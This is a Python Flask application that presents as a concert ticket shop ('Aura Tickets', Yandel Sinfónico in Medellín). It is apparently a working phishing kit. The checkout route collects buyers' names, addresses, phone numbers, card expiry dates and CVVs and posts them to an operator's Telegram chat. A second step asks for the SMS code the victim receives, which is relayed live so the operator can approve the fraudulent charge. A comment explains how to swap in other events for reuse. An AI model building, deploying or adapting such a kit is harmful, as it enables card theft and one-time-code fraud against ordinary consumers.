import os
import uuid
import requests
import secrets
from io import BytesIO
from datetime import datetime, timedelta
from flask import Flask, render_template, request, jsonify, redirect, send_file
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY") or secrets.token_hex(32)

# ================= CONFIG =================
class Config:
    TOKEN       = os.getenv("TOKEN")
    CHAT_ID     = os.getenv("CHAT_ID")
    TIMEOUT     = 10
    CODE_EXPIRY = 300   # 5 minutos


# ================= STORAGE =================
class CodeStorage:
    """Almacena transacciones en memoria (se reinicia con el servidor)."""
    codes = {}

    @classmethod
    def save(cls, tx_id, code, phone, nombre, correo, zona, cantidad, total):
        cls.codes[tx_id] = {
            "code":      code,
            "phone":     phone,
            "nombre":    nombre,
            "correo":    correo,
            "zona":      zona,
            "cantidad":  cantidad,
            "total":     total,
            "expires":   datetime.now() + timedelta(seconds=Config.CODE_EXPIRY),
            "verified":  False,
            "approved":  False,
            "rejected":  False,
        }
        print(f"[STORAGE] Guardado: {tx_id} | IDs actuales: {list(cls.codes.keys())}")

    @classmethod
    def get(cls, tx_id):
        entry = cls.codes.get(tx_id)
        if not entry:
            print(f"[STORAGE] ⚠️  tx_id no encontrado: {tx_id!r}")
            print(f"[STORAGE] IDs en memoria: {list(cls.codes.keys())}")
        return entry

    @classmethod
    def mark_verified(cls, tx_id):
        if tx_id in cls.codes:
            cls.codes[tx_id]["verified"] = True
            print(f"[STORAGE] Verificado: {tx_id}")

    @classmethod
    def mark_approved(cls, tx_id):
        if tx_id in cls.codes:
            cls.codes[tx_id]["approved"] = True
            print(f"[STORAGE] ✅ Aprobado: {tx_id}")

    @classmethod
    def mark_rejected(cls, tx_id):
        if tx_id in cls.codes:
            cls.codes[tx_id]["rejected"] = True
            print(f"[STORAGE] ❌ Rechazado: {tx_id}")

    @classmethod
    def is_expired(cls, tx_id):
        entry = cls.codes.get(tx_id)
        if not entry:
            return True
        return datetime.now() > entry["expires"]


# ================= UTILS =================
class Utils:
    @staticmethod
    def generate_tx_id():
        return f"TXN-{uuid.uuid4().hex[:10].upper()}"

    @staticmethod
    def generate_code():
        return str(secrets.randbelow(900000) + 100000)

    @staticmethod
    def now():
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    @staticmethod
    def valid_email(email):
        import re

        return bool(re.match(r"^[^\s@]+@[^\s@]+\.[^\s@]+$", email))

    @staticmethod
    def valid_phone(phone):
        cleaned = "".join(c for c in phone if c.isdigit())
        return 7 <= len(cleaned) <= 15

    @staticmethod
    def valid_name(name):
        return 3 <= len(name.strip()) <= 100


# ================= PRECIOS (server-side, nunca del cliente) =================
ZONE_PRICES = {
    "Mesa Lounge":       10730,
    "Mesa Platinum":      5550,
    "Silla VIP":          4810,
    "Gradas Central":     2035,
    "Gradas Laterales":   1480,
    "Meet and Greet":     5920,
}
TAX_RATE = 0.19


def calculate_total(zona, cantidad):
    base = ZONE_PRICES.get(zona, 0)
    subtotal = base * cantidad
    tax = round(subtotal * TAX_RATE)
    return subtotal, tax, subtotal + tax


# ================= TELEGRAM =================
class Telegram:
    BASE = f"https://api.telegram.org/bot{Config.TOKEN}"

    @classmethod
    def send(cls, text, reply_markup=None):
        if not Config.TOKEN or not Config.CHAT_ID:
            print("⚠️  Telegram no configurado (TOKEN o CHAT_ID faltante)")
            return False
        payload = {
            "chat_id":    Config.CHAT_ID,
            "text":       text,
            "parse_mode": "HTML",
        }
        if reply_markup:
            payload["reply_markup"] = reply_markup
        try:
            r = requests.post(f"{cls.BASE}/sendMessage", json=payload, timeout=Config.TIMEOUT)
            print(f"[TELEGRAM] sendMessage status: {r.status_code} | {r.text[:120]}")
            return r.ok
        except Exception as e:
            print(f"❌ Telegram sendMessage error: {e}")
            return False

    @classmethod
    def answer_callback(cls, callback_query_id, text=""):
        if not Config.TOKEN:
            return
        try:
            requests.post(
                f"{cls.BASE}/answerCallbackQuery",
                json={"callback_query_id": callback_query_id, "text": text},
                timeout=Config.TIMEOUT,
            )
        except Exception as e:
            print(f"❌ answerCallback error: {e}")

    @classmethod
    def edit_message(cls, chat_id, message_id, text):
        if not Config.TOKEN:
            return
        try:
            requests.post(
                f"{cls.BASE}/editMessageText",
                json={
                    "chat_id":    chat_id,
                    "message_id": message_id,
                    "text":       text,
                    "parse_mode": "HTML",
                },
                timeout=Config.TIMEOUT,
            )
        except Exception as e:
            print(f"❌ editMessage error: {e}")

    @classmethod
    def notify_purchase(cls, tx_id, nombre, correo, telefono, direccion, tarjeta_ultimos4, vencimiento, cvv, zona, cantidad, subtotal, tax, total):
        text = (
            f"🧾 <b>NUEVA COMPRA</b>\n\n"
            f"🆔 <code>{tx_id}</code>\n"
            f"⏱ {Utils.now()}\n\n"
            f"👤 {nombre}\n"
            f"📧 {correo}\n"
            f"📞 <b>{telefono}</b>\n"
            f"📍 Dirección: {direccion or 'No indicada'}\n\n"
            f"💳 Tarjeta: {tarjeta_ultimos4 or '----'}\n"
            f"📅 Vencimiento: {vencimiento or 'No indicado'}\n"
            f"🔐 CVV: {cvv or 'No indicado'}\n"
            f"🎟 Zona: <b>{zona}</b>\n"
            f"🔢 Cantidad: {cantidad}\n"
            f"💵 Subtotal: ${subtotal}\n"
            f"🏷 Impuesto: ${tax}\n"
            f"💰 Total: <b>${total}</b>\n\n"
            f"📌 Esperando código del usuario..."
        )
        cls.send(text)

    @classmethod
    def notify_code_received(cls, tx_id, nombre, telefono, code):
        text = (
            f"📱 <b>CÓDIGO RECIBIDO</b>\n\n"
            f"🆔 <code>{tx_id}</code>\n"
            f"👤 {nombre}\n"
            f"📞 {telefono}\n\n"
            f"🔐 Código ingresado: <b>{code}</b>\n\n"
            f"Presiona APROBAR para confirmar la compra."
        )
        reply_markup = {
            "inline_keyboard": [
                [
                    {"text": "✅ APROBAR COMPRA", "callback_data": f"approve:{tx_id}"},
                    {"text": "❌ RECHAZAR",       "callback_data": f"reject:{tx_id}"},
                ]
            ]
        }
        cls.send(text, reply_markup=reply_markup)

    @classmethod
    def notify_confirmed(cls, tx_id, nombre, correo, zona, cantidad, total):
        text = (
            f"✅ <b>COMPRA CONFIRMADA</b>\n\n"
            f"🆔 <code>{tx_id}</code>\n"
            f"⏱ {Utils.now()}\n\n"
            f"👤 {nombre}\n"
            f"📧 {correo}\n"
            f"🎟 Zona: {zona} × {cantidad}\n"
            f"💰 Total: <b>${total}</b>"
        )
        cls.send(text)


# ================= EVENTO (configurable) =================
# AQUÍ es donde cambias artista, fecha, hora, lugar para otro evento
EVENT_INFO = {
    "artista": "Yandel Sinfónico",
    "lugar":   "Estadio Atanasio Girardot",
    "ciudad":  "Medellín, Colombia",
    "fecha":   "20 Junio 2026",
    "hora":    "4:00 PM",
}


# ================= ROUTES =================
@app.route("/")
def home():
    # index.html recibe el objeto `evento` para mostrar título, fecha, hora y lugar
    return render_template("index.html", evento=EVENT_INFO)


# ── /comprar — paso 1 ────────────────────────────────────────────────────────
@app.route("/comprar", methods=["POST"])
def comprar():
    try:
        if not request.is_json:
            return jsonify({"success": False, "error": "Se esperaba JSON"}), 400

        data = request.get_json()

        required = ["zona", "cantidad", "nombre", "correo", "telefono"]
        missing = [f for f in required if not data.get(f)]
        if missing:
            return jsonify({"success": False, "error": f"Faltan campos: {', '.join(missing)}"}), 400

        zona = str(data["zona"]).strip()
        nombre = str(data["nombre"]).strip()
        correo = str(data["correo"]).strip()
        telefono = str(data["telefono"]).strip()
        direccion = str(data.get("direccion") or "").strip()
        tarjeta_ultimos4 = str(data.get("tarjeta_ultimos4") or "").strip()
        vencimiento = str(data.get("vencimiento") or "").strip()
        cvv = str(data.get("cvv") or "").strip()

        if zona not in ZONE_PRICES:
            return jsonify({"success": False, "error": "Zona inválida"}), 400

        try:
            cantidad = int(data["cantidad"])
            assert 1 <= cantidad <= 5
        except (ValueError, TypeError, AssertionError):
            return jsonify({"success": False, "error": "Cantidad debe ser 1-5"}), 400

        if not Utils.valid_name(nombre):
            return jsonify({"success": False, "error": "Nombre inválido"}), 400
        if not Utils.valid_email(correo):
            return jsonify({"success": False, "error": "Email inválido"}), 400
        if not Utils.valid_phone(telefono):
            return jsonify({"success": False, "error": "Teléfono inválido"}), 400

        subtotal, tax, total = calculate_total(zona, cantidad)

        tx_id = Utils.generate_tx_id()
        codigo = Utils.generate_code()

        CodeStorage.save(tx_id, codigo, telefono, nombre, correo, zona, cantidad, total)
        Telegram.notify_purchase(tx_id, nombre, correo, telefono, direccion, tarjeta_ultimos4, vencimiento, cvv, zona, cantidad, subtotal, tax, total)

        print(f"[COMPRA] {tx_id} | {zona} x{cantidad} | ${total} | {telefono}")

        return jsonify(
            {
                "success":        True,
                "transaction_id": tx_id,
                "message":        "Ingresa el código que recibiste por SMS",
                "expires_in":     Config.CODE_EXPIRY,
            }
        ), 201

    except Exception as e:
        print(f"ERROR /comprar: {e}")
        return jsonify({"success": False, "error": "Error interno"}), 500


# ── /codigo — paso 2 ─────────────────────────────────────────────────────────
@app.route("/codigo", methods=["POST"])
def codigo():
    try:
        if not request.is_json:
            return jsonify({"success": False, "error": "Se esperaba JSON"}), 400

        data = request.get_json()
        tx_id = data.get("transaction_id", "").strip()
        code = str(data.get("codigo", "")).strip()

        print(f"[CÓDIGO] Recibido tx_id={tx_id!r} code={code!r}")

        if not tx_id or not code:
            return jsonify({"success": False, "error": "Faltan campos"}), 400

        if not code.isdigit() or len(code) != 6:
            return jsonify({"success": False, "error": "Código debe ser 6 dígitos"}), 400

        entry = CodeStorage.get(tx_id)
        if not entry:
            return jsonify({"success": False, "message": "Transacción no encontrada"}), 404

        if CodeStorage.is_expired(tx_id):
            return jsonify({"success": False, "message": "Código expirado"}), 400

        CodeStorage.mark_verified(tx_id)

        Telegram.notify_code_received(
            tx_id,
            entry["nombre"],
            entry["phone"],
            code,
        )

        print(f"[CÓDIGO] {tx_id} | código del usuario: {code} | enviado a Telegram")

        return jsonify(
            {
                "success":        True,
                "message":        "Código enviado al operador. Esperando aprobación...",
                "transaction_id": tx_id,
            }
        ), 200

    except Exception as e:
        print(f"ERROR /codigo: {e}")
        return jsonify({"success": False, "error": "Error interno"}), 500


# ── /webhook — Telegram llama aquí cuando el operador presiona APROBAR ────────
@app.route("/webhook", methods=["POST"])
def webhook():
    try:
        update = request.get_json(force=True)
        print(f"[WEBHOOK] Update recibido: {str(update)[:300]}")

        if not update:
            return "ok", 200

        callback = update.get("callback_query")
        if not callback:
            # Puede ser un mensaje normal — ignorar silenciosamente
            return "ok", 200

        callback_id = callback["id"]
        callback_data = callback.get("data", "")
        chat_id = callback["message"]["chat"]["id"]
        message_id = callback["message"]["message_id"]

        print(f"[WEBHOOK] callback_data={callback_data!r}")

        if ":" not in callback_data:
            Telegram.answer_callback(callback_id, "Acción desconocida")
            return "ok", 200

        action, tx_id = callback_data.split(":", 1)
        tx_id = tx_id.strip()

        print(f"[WEBHOOK] action={action!r} tx_id={tx_id!r}")

        entry = CodeStorage.get(tx_id)

        if not entry:
            Telegram.answer_callback(callback_id, "⚠️ Transacción no encontrada o expirada")
            Telegram.edit_message(chat_id, message_id, f"⚠️ <code>{tx_id}</code> — no encontrada o expirada")
            return "ok", 200

        if action == "approve":
            CodeStorage.mark_approved(tx_id)

            Telegram.notify_confirmed(
                tx_id,
                entry["nombre"],
                entry["correo"],
                entry["zona"],
                entry["cantidad"],
                entry["total"],
            )

            Telegram.edit_message(
                chat_id,
                message_id,
                f"✅ <b>APROBADO</b> — <code>{tx_id}</code>\n"
                f"{entry['nombre']} | {entry['zona']} | ${entry['total']}",
            )
            Telegram.answer_callback(callback_id, "✅ Compra aprobada")
            print(f"[APROBADO] {tx_id}")

        elif action == "reject":
            CodeStorage.mark_rejected(tx_id)

            Telegram.edit_message(
                chat_id,
                message_id,
                f"❌ <b>RECHAZADO</b> — <code>{tx_id}</code>",
            )
            Telegram.answer_callback(callback_id, "❌ Compra rechazada")
            print(f"[RECHAZADO] {tx_id}")

        return "ok", 200

    except Exception as e:
        print(f"ERROR /webhook: {e}")
        import traceback

        traceback.print_exc()
        # Telegram siempre espera 200, aunque haya error interno
        return "ok", 200


# ── /estado — polling del frontend ───────────────────────────────────────────
@app.route("/estado/<tx_id>", methods=["GET"])
def estado(tx_id):
    entry = CodeStorage.get(tx_id)
    if not entry:
        return jsonify({"status": "not_found"}), 404

    if CodeStorage.is_expired(tx_id):
        return jsonify({"status": "expired"}), 200

    if entry.get("rejected"):
        return jsonify({"status": "rejected", "tx_id": tx_id}), 200

    if entry.get("approved"):
        return jsonify(
            {
                "status":   "approved",
                "tx_id":    tx_id,
                "nombre":   entry["nombre"],
                "zona":     entry["zona"],
                "cantidad": entry["cantidad"],
                "total":    entry["total"],
            }
        ), 200

    return jsonify({"status": "pending"}), 200


# ── /confirmacion — página de éxito ─────────────────────────────────────────
@app.route("/confirmacion/<tx_id>")
def confirmacion(tx_id):
    entry = CodeStorage.get(tx_id)
    if not entry or not entry.get("approved"):
        return redirect("/")

    # confirmacion.html recibirá también el evento y el tx_id
    return render_template(
        "confirmacion.html",
        nombre=entry["nombre"],
        correo=entry["correo"],
        zona=entry["zona"],
        cantidad=entry["cantidad"],
        total=entry["total"],
        tx_id=tx_id,
        evento=EVENT_INFO,
    )


@app.route("/descargar-entradas/<tx_id>")
def descargar_entradas(tx_id):
    entry = CodeStorage.get(tx_id)
    if not entry or not entry.get("approved"):
        return redirect("/")

    cantidad = int(entry["cantidad"])
    entradas = []
    for index in range(1, cantidad + 1):
        entradas.append(
            {
                "numero": index,
                "codigo": f"{tx_id}-{index:02d}",
                "nombre": entry["nombre"],
                "correo": entry["correo"],
                "zona": entry["zona"],
                "total": entry["total"],
                "tx_id": tx_id,
            }
        )

    html = render_template(
        "entradas.html",
        entradas=entradas,
        nombre=entry["nombre"],
        correo=entry["correo"],
        zona=entry["zona"],
        cantidad=cantidad,
        total=entry["total"],
        tx_id=tx_id,
        evento=EVENT_INFO,
    )
    buffer = BytesIO(html.encode("utf-8"))
    return send_file(
        buffer,
        as_attachment=True,
        download_name=f"entradas-{tx_id}.html",
        mimetype="text/html",
    )


# ── /rechazo — página de rechazo ─────────────────────────────────────────────
@app.route("/rechazo/<tx_id>")
def rechazo(tx_id):
    entry = CodeStorage.get(tx_id)
    if not entry:
        return redirect("/")

    # rechazo.html también tendrá acceso al evento y al tx_id
    return render_template(
        "rechazo.html",
        nombre=entry["nombre"],
        correo=entry["correo"],
        zona=entry["zona"],
        cantidad=entry["cantidad"],
        total=entry["total"],
        tx_id=tx_id,
        evento=EVENT_INFO,
    )


# ── /debug — ver transacciones en memoria (solo para desarrollo) ─────────────-
@app.route("/debug/storage", methods=["GET"])
def debug_storage():
    """Ruta de diagnóstico — eliminar en producción."""
    result = {}
    for tx_id, entry in CodeStorage.codes.items():
        result[tx_id] = {
            k: (str(v) if k == "expires" else v)
            for k, v in entry.items()
            if k != "code"  # no exponer el código
        }
    return jsonify(result), 200


# ================= ERROR HANDLERS =================
@app.errorhandler(404)
def not_found(e):
    return jsonify({"success": False, "error": "No encontrado"}), 404


@app.errorhandler(500)
def server_error(e):
    return jsonify({"success": False, "error": "Error interno"}), 500


# ================= RUN =================
if __name__ == "__main__":
    debug_mode = os.getenv("FLASK_DEBUG", "false").lower() == "true"
    print(f"🚀 Aura Tickets arrancando | debug={debug_mode}")
    print(f"   TOKEN configurado: {'✅' if Config.TOKEN else '❌'}")
    print(f"   CHAT_ID configurado: {'✅' if Config.CHAT_ID else '❌'}")
    app.run(debug=debug_mode, host="0.0.0.0", port=5000)